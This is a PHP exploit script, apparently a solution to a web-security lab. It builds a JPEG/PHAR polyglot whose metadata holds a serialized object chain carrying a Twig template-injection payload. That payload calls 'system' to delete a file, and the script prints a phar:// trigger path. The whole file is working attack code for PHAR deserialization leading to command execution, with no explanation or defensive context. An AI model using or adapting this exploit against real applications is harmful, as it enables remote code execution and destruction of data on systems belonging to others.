<?php
// Run: php -d phar.readonly=0 phar_deser.php

ini_set('phar.readonly', 0);

function generate_base_phar($object, $prefix = '') {
    global $tempname;

    @unlink($tempname);

    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'test');
    $phar->setStub($prefix . "<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($object);
    $phar->stopBuffering();

    $basecontent = file_get_contents($tempname);
    @unlink($tempname);

    return $basecontent;
}

function generate_polyglot($phar, $jpeg) {
    $phar = substr($phar, 6);
    $len = strlen($phar) + 2;
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . '        ' . substr($new, 156);

    $checksum = 0;
    for ($i = 0; $i < 512; $i++) {
        $checksum += ord(substr($contents, $i, 1));
    }

    $octal = sprintf('%07o', $checksum);
    return substr($contents, 0, 148) . $octal . substr($contents, 155);
}

class CustomTemplate {}

class Blog {}

$twig_payload = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}";
$payload = new CustomTemplate;
$blog = new Blog;
$blog->desc = $twig_payload;
$blog->user = 'user';
$payload->template_file_path = $blog;

$tempname = __DIR__ . '/temp.tar.phar';
$jpeg = file_get_contents(__DIR__ . '/in.jpg');
$outfile = __DIR__ . '/out.jpg';
$prefix = '';

@unlink($outfile);

echo serialize($payload) . PHP_EOL;
file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));

echo "[+] Created: out.jpg\n";
echo "[+] Trigger path example: phar://out.jpg/test.txt\n";
